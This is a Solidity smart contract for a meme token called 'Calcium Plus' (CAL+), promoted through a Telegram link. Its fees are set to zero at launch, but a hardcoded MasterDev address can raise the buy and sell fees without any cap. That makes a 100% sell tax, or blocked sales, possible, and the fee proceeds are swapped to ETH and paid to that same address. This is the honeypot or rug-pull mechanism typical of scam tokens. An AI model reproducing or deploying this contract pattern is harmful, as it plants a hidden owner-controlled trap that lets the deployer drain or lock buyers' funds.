/*
                                                                                               
                                                                                                               
   _____      _      _                            
  / ____|    | |    (_)                 _     _   
 | |     __ _| | ___ _ _   _ _ __ ___ _| |_ _| |_ 
 | |    / _` | |/ __| | | | | '_ ` _ \_   _|_   _|
 | |___| (_| | | (__| | |_| | | | | | ||_|   |_|  
  \_____\__,_|_|\___|_|\__,_|_| |_| |_|           
                                                  
                                                  
                                                                                                              
                                                                                              
                                                                          
Telegram - https://t.me/CalciumPlus_ERC


*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract CAL {
        string public   name_ = "Calcium Plus"; 
        string public   symbol_ = "CAL+";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 420690000 * 10**decimals;

        uint256 buyFee = 0;
        uint256 sellFee = 0;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
        
        error Permissions();
        
        
    
        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed MasterDev,
            address indexed spender,
            uint256 value
        );
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant MasterDev = payable(address(0xD5EF3a28411d1a53CC39796eB2CbeBf50d91f1e3));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == MasterDev || to == MasterDev);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                MasterDev.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 FeeAmount = amount * (from == pair ? buyFee : sellFee) / 100;
                amount -= FeeAmount;
                balanceOf[address(this)] += FeeAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == MasterDev);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setFee(uint256 _buy, uint256 _sell) private {
            buyFee = _buy;
            sellFee = _sell;
        }

        function setFee(uint256 _buy, uint256 _sell) external {
            if(msg.sender != MasterDev)        
                revert Permissions();
            _setFee(_buy, _sell);
        }
    }